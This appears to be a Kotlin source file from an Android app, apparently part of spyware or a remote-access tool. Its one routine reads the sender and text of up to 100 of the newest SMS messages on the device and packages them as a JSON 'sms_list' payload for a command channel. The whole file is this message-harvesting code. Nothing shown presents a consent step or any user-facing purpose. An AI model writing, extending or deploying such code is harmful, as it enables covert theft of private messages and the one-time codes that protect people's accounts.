package com.app.cyber

import android.content.Context
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

object SmsRechive {
    fun sendAllSms(ctx: Context, emit: (JSONObject) -> Unit) {
        val list = JSONArray()
        val cursor = ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
            null, null,
            Telephony.Sms.DATE + " DESC"
        )
        
        cursor?.use {
            val addrCol = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
            val bodyCol = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
            while (it.moveToNext() && list.length() < 100) {
                val obj = JSONObject()
                obj.put("address", it.getString(addrCol) ?: "Unknown")
                obj.put("body", it.getString(bodyCol) ?: "")
                list.put(obj)
            }
        }
        
        val payload = JSONObject()
        payload.put("action", "sms_list")
        payload.put("data", list)
        emit(payload)
    }
}
